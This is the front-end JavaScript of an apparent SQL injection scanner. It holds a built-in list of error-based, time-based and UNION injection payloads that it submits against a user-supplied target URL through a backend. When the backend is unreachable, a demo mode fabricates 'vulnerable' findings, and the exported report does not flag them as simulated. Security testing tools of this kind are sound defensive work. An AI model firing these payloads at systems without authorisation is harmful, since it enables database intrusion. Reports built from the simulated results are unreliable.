// ── All payloads mirrored from backend ──
const PAYLOADS = {
  error_based: [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "\" OR \"1\"=\"1",
    "' OR ''='",
    "' OR 1=1#",
    "' AND 1=CONVERT(int, 'a') --",
    "' AND extractvalue(1,concat(0x7e,version())) --",
    "' AND 1=1 UNION SELECT null --",
  ],
  time_based: [
    "'; WAITFOR DELAY '0:0:5' --",
    "' OR SLEEP(5) --",
    "'; SELECT pg_sleep(5) --",
    "' OR 1=1 AND SLEEP(5) --",
    "1; WAITFOR DELAY '0:0:5' --",
  ],
  union_based: [
    "' UNION SELECT null --",
    "' UNION SELECT null,null --",
    "' UNION SELECT null,null,null --",
    "' UNION ALL SELECT 'vuln','vuln' --",
  ]
};

const TECHNIQUE_LABELS = {
  error_based: 'ERROR',
  time_based: 'TIME',
  union_based: 'UNION'
};

const RISK_COLORS = {
  CRITICAL: 'var(--red)',
  HIGH:     '#ff7b00',
  MEDIUM:   'var(--amber)',
  LOW:      'var(--cyan)',
  SAFE:     'var(--green)'
};

let scanResults = [];
let isScanning = false;
let totalPayloads = 0;

// ── Clock ──
function updateClock() {
  const now = new Date();
  const h = String(now.getHours()).padStart(2, '0');
  const m = String(now.getMinutes()).padStart(2, '0');
  const s = String(now.getSeconds()).padStart(2, '0');
  document.getElementById('clock').textContent = `${h}:${m}:${s}`;
}
setInterval(updateClock, 1000);
updateClock();

// ── Logging ──
function log(msg, type = '') {
  const terminal = document.getElementById('terminal');
  const cursor = document.getElementById('cursor');
  const line = document.createElement('div');
  line.className = `term-line ${type}`;
  line.textContent = msg;
  terminal.insertBefore(line, cursor);
  terminal.scrollTop = terminal.scrollHeight;
}
function clearLog() {
  const terminal = document.getElementById('terminal');
  const cursor = document.getElementById('cursor');
  terminal.innerHTML = '';
  terminal.appendChild(cursor);
}

// ── Progress ──
function setProgress(pct, phase, count) {
  document.getElementById('progressFill').style.width = pct + '%';
  document.getElementById('progressPct').textContent = Math.round(pct) + '%';
  document.getElementById('progressPhase').textContent = phase;
  document.getElementById('progressCount').textContent = count;
}

// ── Payload queue UI (dynamic) ──
function buildPayloadQueue() {
  const list = document.getElementById('payloadList');
  list.innerHTML = '';
  let idx = 0;
  for (const [technique, payloadArr] of Object.entries(PAYLOADS)) {
    // Technique separator
    const sep = document.createElement('div');
    sep.style.cssText = 'font-size:9px;letter-spacing:3px;color:var(--text-muted);padding:8px 0 4px;';
    sep.textContent = `── ${TECHNIQUE_LABELS[technique]}`;
    list.appendChild(sep);

    for (const payload of payloadArr) {
      const row = document.createElement('div');
      row.className = 'payload-row';
      row.dataset.idx = idx;
      row.innerHTML = `
        <span class="payload-idx">${String(idx + 1).padStart(2, '0')}</span>
        <span class="payload-code">${escHtml(payload)}</span>
        <span class="payload-status" id="ps-${idx}">—</span>
      `;
      list.appendChild(row);
      idx++;
    }
  }
  totalPayloads = idx;
  document.getElementById('payloadCount').textContent = `${totalPayloads} LOADED`;
  document.getElementById('statPayloads').textContent = totalPayloads;
}

function setPayloadStatus(idx, status) {
  const row = document.querySelector(`.payload-row[data-idx="${idx}"]`);
  const ps = document.getElementById(`ps-${idx}`);
  if (!row || !ps) return;
  row.classList.remove('firing', 'vuln', 'safe');
  ps.classList.remove('vuln-s', 'safe-s', 'fire-s');
  if (status === 'firing') {
    row.classList.add('firing');
    ps.textContent = 'TESTING...';
    ps.classList.add('fire-s');
  } else if (status === 'vuln') {
    row.classList.add('vuln');
    ps.textContent = '⚠ VULN';
    ps.classList.add('vuln-s');
  } else if (status === 'safe') {
    row.classList.add('safe');
    ps.textContent = '✓ CLEAN';
    ps.classList.add('safe-s');
  } else {
    ps.textContent = '—';
  }
}

function resetPayloads() {
  for (let i = 0; i < totalPayloads; i++) setPayloadStatus(i, 'idle');
}

// ── Auto-detect params from URL ──
function extractParams(url) {
  try {
    const u = new URL(url);
    return [...u.searchParams.keys()];
  } catch { return []; }
}

function showParams(params) {
  const field = document.getElementById('paramField');
  const list = document.getElementById('paramList');
  list.innerHTML = '';
  if (!params.length) { field.style.display = 'none'; return; }
  field.style.display = '';
  params.forEach(p => {
    const badge = document.createElement('span');
    badge.className = 'badge safe';
    badge.style.cssText = 'font-size:10px;padding:2px 8px;';
    badge.textContent = p;
    list.appendChild(badge);
  });
}

// ── Risk score UI ──
function showRiskPanel(score, label, vulnerableCount, totalTests) {
  const panel = document.getElementById('riskPanel');
  panel.style.display = '';

  const color = RISK_COLORS[label] || 'var(--text-dim)';
  const circumference = 2 * Math.PI * 32; // ~201
  const dash = (score / 100) * circumference;

  const arc = document.getElementById('riskArc');
  arc.style.stroke = color;
  arc.setAttribute('stroke-dasharray', `${dash} ${circumference}`);

  document.getElementById('riskScoreNum').textContent = score;
  document.getElementById('riskLabelText').style.color = color;
  document.getElementById('riskLabelText').textContent = label;

  const summaryMap = {
    CRITICAL: 'Active SQL injection confirmed. Immediate remediation required.',
    HIGH:     'Strong injection signals detected across multiple vectors.',
    MEDIUM:   'Possible injection detected. Manual verification recommended.',
    LOW:      'Minor anomalies detected. Low exploitation probability.',
    SAFE:     'No injection indicators found across all tested payloads.'
  };
  document.getElementById('riskSummaryText').textContent = summaryMap[label] || '';

  // Technique badges
  const badges = document.getElementById('riskBadges');
  badges.innerHTML = '';
  const found = {};
  scanResults.filter(r => r.vuln).forEach(r => { found[r.technique] = true; });
  Object.keys(found).forEach(t => {
    const b = document.createElement('span');
    b.className = 'badge vuln';
    b.textContent = TECHNIQUE_LABELS[t] || t.toUpperCase();
    badges.appendChild(b);
  });

  // Top bar risk
  const statRisk = document.getElementById('statRisk');
  statRisk.textContent = label;
  statRisk.style.color = color;
}

// ── Main scan ──
async function startScan() {
  if (isScanning) return;
  const url = document.getElementById('urlInput').value.trim();
  if (!url) { log('[!] Error: Enter a valid target URL', 'warn'); return; }

  isScanning = true;
  scanResults = [];
  buildPayloadQueue();
  resetPayloads();

  const detectedParams = extractParams(url);
  showParams(detectedParams);

  const btn = document.getElementById('scanBtn');
  btn.classList.add('running');
  btn.querySelector('.scan-btn-inner').innerHTML = `
    <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><rect x="3" y="3" width="3" height="8" fill="currentColor"/><rect x="8" y="3" width="3" height="8" fill="currentColor"/></svg>
    SCANNING...`;

  document.getElementById('statusDot').className = 'status-dot scanning';
  document.getElementById('statusLabel').textContent = 'SCANNING';
  document.getElementById('progressPulse').classList.add('active');
  document.getElementById('resultsSection').style.display = 'none';
  document.getElementById('riskPanel').style.display = 'none';
  document.getElementById('resultsBody').innerHTML = '';
  document.getElementById('statVulns').textContent = '0';
  document.getElementById('statRisk').textContent = '—';
  document.getElementById('statRisk').style.color = 'var(--text-dim)';

  clearLog();
  log(`┌─ Scan initiated: ${new Date().toLocaleTimeString()}`, 'head');
  log(`├─ Target: ${url}`, 'info');
  log(`├─ Method: ${document.getElementById('methodSelect').value}`, 'info');
  log(`├─ Techniques: error-based, UNION, time-based blind`, 'info');
  log(`├─ Params detected: ${detectedParams.length ? detectedParams.join(', ') : 'none (appending to URL)'}`, 'info');
  log(`└─ Total payloads: ${totalPayloads}`, 'info');
  log('', '');

  setProgress(5, 'Establishing baseline...', `0 / ${totalPayloads}`);

  let useSimulation = false;
  let backendErrorMsg = null;

  try {
    let res;
    try {
      res = await fetch('/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          url,
          method: document.getElementById('methodSelect').value,
          timeout: parseInt(document.getElementById('timeout').value) || 8
        }),
        signal: AbortSignal.timeout(120000)
      });
    } catch (networkErr) {
      // ── Genuine network-level failure (backend unreachable, CORS, timeout) ──
      // Only THIS counts as "no backend" — fall through to demo mode below.
      throw { kind: 'network', error: networkErr };
    }

    let data;
    try {
      data = await res.json();
    } catch (parseErr) {
      throw { kind: 'network', error: parseErr };
    }

    if (!res.ok || data.error) {
      // ── Real backend responded, but with an error (e.g. no params found, bad URL,
      // target unreachable). This is a REAL result, not a reason to fake data. ──
      throw { kind: 'backend', error: new Error(data.error || `Backend error (HTTP ${res.status})`) };
    }

    // ── Real backend mode ──
    const bLen = data.baseline_length;
    const bTime = data.baseline_time;
    log(`[+] Baseline: ${bLen} bytes in ${bTime}s`, 'ok');
    if (data.meta && data.meta.params_found && data.meta.params_found.length) {
      log(`[+] Parameters found: ${data.meta.params_found.join(', ')}`, 'info');
    }
    log('', '');

    let vulns = 0;
    for (let i = 0; i < data.results.length; i++) {
      const r = data.results[i];
      setPayloadStatus(i, 'firing');
      setProgress(10 + ((i + 1) / data.results.length) * 85,
        `Testing payload ${i + 1} [${(TECHNIQUE_LABELS[r.technique] || r.technique)}]...`,
        `${i + 1} / ${data.results.length}`);
      await delay(200);

      const isVuln = r.vulnerable;
      setPayloadStatus(i, isVuln ? 'vuln' : 'safe');

      const techTag = `[${(TECHNIQUE_LABELS[r.technique] || r.technique).padEnd(5)}]`;
      const paramTag = r.parameter ? `[${r.parameter}]` : '';

      if (isVuln) {
        vulns++;
        const reason = r.time_anomaly
          ? `time anomaly +${(r.response_time - bTime).toFixed(1)}s`
          : r.error_keyword ? 'DB error leaked' : `Δ${r.diff}b`;
        log(`[!!!] VULNERABLE ${techTag}${paramTag} → ${r.payload} (${reason})`, 'vuln');
      } else {
        log(`[ ✓ ] Clean     ${techTag}${paramTag} → ${r.payload}  (Δ${r.diff}b, ${r.response_time}s)`, 'ok');
      }

      document.getElementById('statVulns').textContent = vulns;
      scanResults.push({
        idx: i + 1,
        payload: r.payload,
        technique: r.technique,
        parameter: r.parameter || '—',
        diff: r.diff,
        responseTime: r.response_time,
        timeAnomaly: r.time_anomaly,
        errorKeyword: r.error_keyword,
        vuln: isVuln
      });
    }

    // Show risk score
    showRiskPanel(data.risk_score, data.risk_label, data.vulnerable_count, data.total_tests);
    log('', '');
    log(`[+] Risk Score: ${data.risk_score}/100 — ${data.risk_label}`, data.risk_score >= 40 ? 'vuln' : 'ok');

  } catch (e) {
    if (e && e.kind === 'backend') {
      // ── Real backend error: show it honestly, do NOT fabricate a score ──
      backendErrorMsg = e.error.message;
      log(`[!] Backend error: ${backendErrorMsg}`, 'warn');
      log('[!] Scan aborted — no results to report.', 'warn');

      document.getElementById('progressPulse').classList.remove('active');
      setProgress(0, 'Scan failed', `0 / ${totalPayloads}`);
      isScanning = false;
      btn.classList.remove('running');
      btn.querySelector('.scan-btn-inner').innerHTML = `
        <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><polygon points="4,2 14,8 4,14" fill="currentColor"/></svg>
        EXECUTE SCAN`;
      document.getElementById('statusDot').className = 'status-dot';
      document.getElementById('statusLabel').textContent = 'ERROR';
      return; // bail out completely — do not fall through to demo mode
    }

    // ── Genuine network-level failure → demo / simulation mode ──
    useSimulation = true;
    log('[~] Running in DEMO mode (Flask backend unreachable)', 'warn');
    log('[~] Simulating multi-technique scan...', 'warn');
    log('', '');

    const baselineLen = Math.floor(Math.random() * 800) + 1200;
    const baselineTime = 0.12;
    log(`[+] Baseline: ${baselineLen} bytes in ${baselineTime}s`, 'ok');
    log('', '');

    // Flatten all payloads for demo
    const allPayloads = [];
    for (const [technique, arr] of Object.entries(PAYLOADS)) {
      arr.forEach(p => allPayloads.push({ payload: p, technique }));
    }

    const demoVulnIdxs = new Set([1, 6, 12, 15]); // a few "vulnerable" ones
    let vulns = 0;

    for (let i = 0; i < allPayloads.length; i++) {
      const { payload, technique } = allPayloads[i];
      setPayloadStatus(i, 'firing');
      setProgress(
        10 + ((i + 1) / allPayloads.length) * 85,
        `Testing payload ${i + 1} [${TECHNIQUE_LABELS[technique]}]...`,
        `${i + 1} / ${allPayloads.length}`
      );
      const waitMs = technique === 'time_based' ? 800 + Math.random() * 400 : 300 + Math.random() * 200;
      await delay(waitMs);

      const isVuln = demoVulnIdxs.has(i);
      const diff = isVuln ? Math.floor(Math.random() * 900) + 200 : Math.floor(Math.random() * 40) + 2;
      const respTime = isVuln && technique === 'time_based'
        ? (5 + Math.random()).toFixed(2)
        : (baselineTime + Math.random() * 0.3).toFixed(2);
      const timeAnomaly = isVuln && technique === 'time_based';
      const errorKw = isVuln && technique === 'error_based';

      setPayloadStatus(i, isVuln ? 'vuln' : 'safe');

      const techTag = `[${TECHNIQUE_LABELS[technique].padEnd(5)}]`;
      if (isVuln) {
        vulns++;
        const reason = timeAnomaly ? `time anomaly +${(respTime - baselineTime).toFixed(1)}s` : errorKw ? 'DB error leaked' : `Δ${diff}b`;
        log(`[!!!] VULNERABLE ${techTag} → ${payload} (${reason})`, 'vuln');
      } else {
        log(`[ ✓ ] Clean     ${techTag} → ${payload}  (Δ${diff}b, ${respTime}s)`, 'ok');
      }

      document.getElementById('statVulns').textContent = vulns;
      scanResults.push({
        idx: i + 1, payload, technique,
        parameter: detectedParams[0] || 'input',
        diff, responseTime: parseFloat(respTime),
        timeAnomaly, errorKeyword: errorKw,
        vuln: isVuln
      });
    }

    // Simulated risk score
    const simScore = Math.min(vulns * 22, 100);
    const simLabel = simScore >= 70 ? 'CRITICAL' : simScore >= 40 ? 'HIGH' : simScore >= 20 ? 'MEDIUM' : simScore > 0 ? 'LOW' : 'SAFE';
    showRiskPanel(simScore, simLabel, vulns, allPayloads.length);
    log('', '');
    log(`[+] Risk Score: ${simScore}/100 — ${simLabel}`, simScore >= 40 ? 'vuln' : 'ok');
  }

  // ── Scan complete ──
  setProgress(100, 'Scan complete', `${scanResults.length} / ${scanResults.length}`);
  document.getElementById('progressPulse').classList.remove('active');

  const totalVulns = scanResults.filter(r => r.vuln).length;
  log('', '');
  log('─'.repeat(50), 'muted');
  if (totalVulns > 0) {
    log(`[!!!] SCAN COMPLETE — ${totalVulns} VULNERABILITIES DETECTED`, 'vuln');
  } else {
    log('[+] SCAN COMPLETE — No SQL injection detected', 'ok');
  }
  log(`[+] Report ready — ${scanResults.length} payloads tested`, 'info');
  if (useSimulation) log('[~] Connect Flask backend for real scan results', 'warn');

  // ── Results table ──
  const tbody = document.getElementById('resultsBody');
  for (const r of scanResults) {
    const tr = document.createElement('tr');
    const techColor = r.technique === 'time_based' ? 'var(--amber)' : r.technique === 'union_based' ? 'var(--cyan)' : 'var(--text-dim)';
    const timeFlag = r.timeAnomaly ? `<span style="color:var(--amber);">⏱ ${r.responseTime}s</span>` : `${r.responseTime}s`;
    tr.innerHTML = `
      <td>${String(r.idx).padStart(2, '0')}</td>
      <td style="color:var(--cyan);max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="${escHtml(r.payload)}">${escHtml(r.payload)}</td>
      <td style="color:${techColor};font-size:10px;letter-spacing:1px;">${(TECHNIQUE_LABELS[r.technique] || r.technique).toUpperCase()}</td>
      <td style="color:var(--text-dim);font-size:10px;">${escHtml(String(r.parameter))}</td>
      <td style="color:${r.diff > 50 ? 'var(--red)' : 'var(--text-dim)'};">Δ${r.diff}</td>
      <td style="font-size:11px;">${timeFlag}</td>
      <td><span class="badge ${r.vuln ? 'vuln' : 'safe'}">${r.vuln ? 'VULNERABLE' : 'CLEAN'}</span></td>
    `;
    tbody.appendChild(tr);
  }
  document.getElementById('resultsSection').style.display = 'block';

  // ── Reset button ──
  isScanning = false;
  btn.classList.remove('running');
  btn.querySelector('.scan-btn-inner').innerHTML = `
    <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><polygon points="4,2 14,8 4,14" fill="currentColor"/></svg>
    EXECUTE SCAN`;
  document.getElementById('statusDot').className = 'status-dot done';
  document.getElementById('statusLabel').textContent = totalVulns > 0 ? 'VULN FOUND' : 'COMPLETE';
}

// ── Report export ──
function downloadReport() {
  const url = document.getElementById('urlInput').value.trim();
  const vulns = scanResults.filter(r => r.vuln);
  const score = document.getElementById('riskScoreNum').textContent;
  const label = document.getElementById('riskLabelText').textContent;

  let txt = `VULNSCAN PRO v3.0 — SQL INJECTION REPORT\n`;
  txt += `${'═'.repeat(60)}\n`;
  txt += `Generated : ${new Date().toLocaleString()}\n`;
  txt += `Target    : ${url}\n`;
  txt += `Risk Score: ${score}/100 — ${label}\n`;
  txt += `Vulns     : ${vulns.length} / ${scanResults.length} tests\n\n`;
  txt += `${'─'.repeat(60)}\n\n`;

  for (const r of scanResults) {
    const status = r.vuln ? '⚠ VULNERABLE' : '✓ CLEAN';
    txt += `[${String(r.idx).padStart(2,'0')}] ${status}\n`;
    txt += `     Payload  : ${r.payload}\n`;
    txt += `     Technique: ${r.technique}\n`;
    txt += `     Parameter: ${r.parameter}\n`;
    txt += `     Δ Bytes  : ${r.diff}\n`;
    txt += `     Resp Time: ${r.responseTime}s${r.timeAnomaly ? ' ⏱ TIME ANOMALY' : ''}\n`;
    if (r.errorKeyword) txt += `     DB Error : YES — error keyword in response\n`;
    txt += '\n';
  }

  txt += `${'─'.repeat(60)}\n`;
  txt += `SUMMARY: ${vulns.length} vulnerabilities confirmed.\n`;
  txt += `Risk Score: ${score}/100 — ${label}\n`;

  const techniques = [...new Set(vulns.map(r => r.technique))];
  if (techniques.length) txt += `Techniques confirmed: ${techniques.join(', ')}\n`;

  const blob = new Blob([txt], { type: 'text/plain' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = `vulnscan_report_${Date.now()}.txt`;
  a.click();
}

// ── Helpers ──
function escHtml(s) {
  return String(s)
    .replace(/&/g,'&amp;')
    .replace(/</g,'&lt;')
    .replace(/>/g,'&gt;')
    .replace(/"/g,'&quot;');
}
function delay(ms) { return new Promise(r => setTimeout(r, ms)); }

// ── Init ──
buildPayloadQueue();

// Live param detection as user types URL
document.getElementById('urlInput').addEventListener('input', function() {
  const params = extractParams(this.value.trim());
  showParams(params);
});